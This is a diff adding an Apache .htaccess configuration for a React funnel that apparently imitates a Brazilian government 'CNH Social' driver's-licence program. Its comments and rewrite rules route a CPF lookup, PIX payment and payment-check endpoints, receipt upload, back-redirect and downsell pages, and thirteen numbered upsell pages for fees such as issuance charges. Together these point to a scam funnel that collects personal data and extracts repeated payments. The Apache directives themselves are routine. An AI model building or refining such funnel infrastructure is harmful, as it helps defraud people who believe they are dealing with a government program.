@@ -1,0 +1,81 @@
+# Funil CNH Social 2026 (Programa CNH do Brasil) - Apache config
+# Front = app React compilado (SPA). As rotas /login, /verificacao, /saiba-mais,
+# /verify-availability, /chat, /pagamento, /pix-payment, /success ... sao
+# resolvidas pelo JS do index.html. As chamadas /api/* do front vao para o
+# api_proxy.php (adaptador .private/cnh_compat.php).
+
+# Charset (evita mojibake em servidores sem charset no header)
+AddDefaultCharset UTF-8
+<IfModule mod_mime.c>
+    AddCharset UTF-8 .html .htm .css .js .json
+    AddType application/json .json
+    AddType video/mp4 .mp4
+    AddType font/woff2 .woff2
+    AddType font/woff  .woff
+</IfModule>
+
+# Bloqueia acesso a pastas/arquivos privados (credenciais, .env, logs, sqlite)
+RedirectMatch 404 /\.private
+RedirectMatch 404 /\.git
+RedirectMatch 404 /_env-templates
+RedirectMatch 404 \.env$
+RedirectMatch 404 \.log$
+RedirectMatch 404 \.sqlite$
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # Forca HTTPS quando disponivel
+    RewriteCond %{HTTPS} !=on
+    RewriteCond %{HTTP:X-Forwarded-Proto} !=https
+    RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
+
+    # API do front React -> api_proxy.php (adaptador)
+    #   GET  /api/consulta-cpf/{cpf}      POST /api/pix
+    #   GET  /api/check-payment?id=...    GET  /api/transaction/{id}
+    #   POST /api/log-access | /api/notify-approved | /api/comprovantes-upload
+    RewriteRule ^api/(.*)$ api_proxy.php?cnh_api=$1 [QSA,L]
+
+    # Upsells (pasta /upsell/01-taxa-emissao.html ... 13-cnh-digital-premium.html),
+    # back redirect e downsell do front: atalhos sem .html
+    RewriteRule ^(back-redirect|downsell)/?$ $1.html [L]
+    RewriteRule ^upsell/([0-9]{2}-[a-z0-9-]+)/?$ upsell/$1.html [L]
+
+    # Links antigos /index2 ... /index14 -> redirecionam (via HTML) para a nova pasta /upsell/
+    RewriteRule ^index([2-9]|1[0-4])/?$ index$1.html [L]
+
+    # SPA fallback: rotas internas do app -> index.html
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_URI} !^/api_proxy\.php
+    RewriteRule ^(login|verificacao|saiba-mais|verify-availability|chat|pagamento|pix-payment|success|sucess|cadastro-concluido|[0-9]{11})/?$ index.html [L]
+</IfModule>
+
+DirectoryIndex index.html
+
+# SPA fallback SEM depender de mod_rewrite (Apache 2.2.16+): qualquer rota
+# inexistente (/login, /chat, /pagamento...) serve o index.html do app.
+# (as chamadas /api/* nao passam por aqui: js/api-bridge.js as envia direto
+#  para api_proxy.php?cnh_api=...)
+<IfModule !mod_rewrite.c>
+    FallbackResource /index.html
+</IfModule>
+
+# Cache curto pro HTML, agressivo pra imagens/video/fontes
+<IfModule mod_expires.c>
+    ExpiresActive On
+    ExpiresByType image/jpeg "access plus 30 days"
+    ExpiresByType image/png  "access plus 30 days"
+    ExpiresByType image/webp "access plus 30 days"
+    ExpiresByType image/svg+xml "access plus 30 days"
+    ExpiresByType video/mp4  "access plus 30 days"
+    ExpiresByType font/woff2 "access plus 30 days"
+    ExpiresByType text/css   "access plus 7 days"
+    ExpiresByType application/javascript "access plus 7 days"
+    ExpiresByType text/html  "access plus 0 seconds"
+</IfModule>
+
+# Permite acesso direto ao api_proxy.php
+<Files "api_proxy.php">
+    Require all granted
+</Files>
